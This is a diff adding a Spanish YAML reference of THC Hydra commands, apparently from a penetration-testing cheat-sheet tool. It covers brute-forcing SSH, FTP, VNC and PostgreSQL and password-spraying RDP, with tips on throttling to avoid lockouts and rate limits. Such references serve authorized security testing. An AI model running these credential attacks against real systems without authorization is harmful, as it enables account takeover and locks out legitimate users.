@@ -1,0 +1,60 @@
+# Comandos de THC Hydra: fuerza bruta y spraying de servicios de red.
+tool: hydra
+area: cracking
+url: https://github.com/vanhauser-thc/thc-hydra
+commands:
+  - id: hydra-ssh
+    title: Fuerza bruta de SSH
+    cmd: |
+      hydra -L users.txt -P {{WORDLIST}} -t 4 -f ssh://{{RHOST}}
+    phase: credential-access
+    tags: [ssh, brute-force]
+    notes: >-
+      -t 4 porque muchos servidores cortan más conexiones simultáneas (MaxStartups); -f para al primer
+      acierto. Antes, comprueba con nmap que acepta contraseña: si solo admite clave, no hay nada que
+      probar. Deja un rastro enorme en auth.log.
+    refs: [https://github.com/vanhauser-thc/thc-hydra]
+
+  - id: hydra-ftp
+    title: Fuerza bruta de FTP
+    cmd: |
+      hydra -L users.txt -P {{WORDLIST}} -f ftp://{{RHOST}}
+    phase: credential-access
+    tags: [ftp, brute-force]
+    notes: >-
+      FTP no suele limitar intentos y va en claro. Prueba antes anonymous y las parejas usuario =
+      contraseña con -e nsr (vacía, igual al usuario y al revés).
+    refs: [https://github.com/vanhauser-thc/thc-hydra]
+
+  - id: hydra-rdp
+    title: Spraying de una contraseña por RDP
+    cmd: |
+      hydra -L users.txt -p '{{PASS}}' -t 1 -W 3 rdp://{{RHOST}}
+    phase: credential-access
+    tags: [rdp, spraying]
+    notes: >-
+      Una sola contraseña contra muchos usuarios, despacio (-t 1 -W 3): RDP bloquea cuentas como
+      cualquier login de Windows. Mira antes la política de bloqueo del dominio.
+    refs: [https://github.com/vanhauser-thc/thc-hydra]
+
+  - id: hydra-vnc
+    title: Fuerza bruta de VNC
+    cmd: |
+      hydra -P {{WORDLIST}} -s 5900 -f vnc://{{RHOST}}
+    phase: credential-access
+    tags: [vnc, brute-force]
+    notes: >-
+      VNC no tiene usuario, solo contraseña, y el protocolo clásico solo usa sus 8 primeros
+      caracteres. Algunos servidores bloquean durante un rato tras varios fallos.
+    refs: [https://github.com/vanhauser-thc/thc-hydra]
+
+  - id: hydra-postgres
+    title: Fuerza bruta de PostgreSQL
+    cmd: |
+      hydra -l postgres -P {{WORDLIST}} -f postgres://{{RHOST}}
+    phase: credential-access
+    tags: [postgresql, brute-force]
+    notes: >-
+      postgres es el superusuario por defecto. Si pg_hba.conf no deja conectar desde tu IP, el error
+      es no pg_hba.conf entry y ninguna contraseña funcionará desde fuera.
+    refs: [https://github.com/vanhauser-thc/thc-hydra]
